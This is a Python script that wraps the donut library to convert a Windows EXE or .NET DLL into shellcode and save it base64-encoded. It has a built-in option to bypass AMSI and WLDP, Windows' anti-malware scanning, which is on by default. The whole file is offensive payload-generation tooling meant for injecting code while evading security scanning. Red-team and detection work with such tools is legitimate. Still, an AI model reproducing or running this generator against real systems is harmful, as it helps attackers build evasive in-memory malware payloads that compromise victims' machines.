import donut
import sys
import os
import ntpath
import string
import argparse
from base64 import b64encode as b64e

# PARSE SCRIPT ARGUMENTS

def get_args():
    parser = argparse.ArgumentParser(description='Donut/Injector Program')
    parser.add_argument('-i', dest='filename', type=str, required=True, help='Input File')
    parser.add_argument('-a', dest='Arch', type=int, required=False, help='Target architecture : 1=x86, 2=amd64, 3=x86+amd64(default).')
    parser.add_argument('-p', dest='Params', type=str, required=False, help='Optional parameters or command line, separated by comma or semi-colon.' )
    parser.add_argument('-n', dest='Namespace', type=str, required=False, help='Optional class name.class (required for .NET DLL)')
    parser.add_argument('-b', dest='Bypass', type=int, required=False, help='Bypass AMSI/WLDP : 1=skip, 2=abort on fail, 3=continue on fail.(default)')
    parser.add_argument('-m', dest='Method', type=str, required=False, help='Optional method or API name for DLL. (method is required for .NET DLL)')
    return parser.parse_args()

# PARSE FILENAME (TAKES FULL PATH AND CURRENT DIR)

if __name__ == '__main__':
    args = get_args()

print(f"[!] Generating shellcode from file")

files = [f for f in os.listdir('.') if os.path.isfile(f)]

def create_donuts_exe(filename,Params,Arch,Bypass):
    if filename not in files:
        sc = donut.create(file=str(filename),params=str(Params),arch=(Arch),bypass=(Bypass))
        if sc is None:
                print(f"[-] Cannot find file. Ensure that file is either in current directory or full path is specified!")
                sys.exit(1)
    else:
        sc = donut.create(file=str(filename),params=str(Params),arch=(Arch),bypass=(Bypass))
    return sc
               
def create_donuts_dll(filename,Params,Arch,Bypass,Namespace,Method):
    if filename not in files:
        sc = donut.create(file=str(filename),params=str(Params),arch=(Arch),bypass=(Bypass),cls=str(Namespace),method=str(Method))
        if sc is None:
                print(f"[-] Cannot find file. Ensure that file is either in current directory or full path is specified!")
                sys.exit(1)
    else:
        sc = donut.create(file=str(filename),params=str(Params),arch=(Arch),bypass=(Bypass),cls=str(Namespace),method=str(Method))
    return sc

def filecreation(filename, Arch, sc):
    if Arch == 1:
        archstr = "x86"
    
    if Arch == 2:
        archstr = "x64"

    if Arch == 3:
        archstr = "x86_amd64"
       
    head,tail = ntpath.split(filename)
    sc_filename = tail.split('.')[0]+'{}'.format(archstr)
    sc_filepath = os.path.join(os.getcwd(),sc_filename)
    fileb = open(sc_filepath+'.b64','w')
    fileb.write(b64e(sc).decode())
    fileb.close()
    print(f"[+] Base64 version is written to:\n    {sc_filepath}.b64")

if not ".dll" in args.filename:
    if args.Params == None:
        args.Params = None
    if args.Bypass == None:
        args.Bypass = 3    
    if args.Arch == None:
        args.Arch = 3  
    sc = create_donuts_exe(args.filename,args.Params,args.Arch,args.Bypass)
    filecreation(args.filename, args.Arch, sc)
   
if ".dll" in args.filename:
    if args.Params == None:
        args.Params = None
    if args.Bypass == None:
        args.Bypass = 3
    if args.Arch == None:
        args.Arch = 3  
    if args.Namespace == None: 
        print("You need to enter a Namespace and Class")
        exit(0)
    if args.Method == None:
        print("You need to enter a method :(")
        exit(0)
    sc = create_donuts_dll(args.filename,args.Params,args.Arch,args.Bypass,args.Namespace,args.Method)
    filecreation(args.filename, args.Arch, sc)

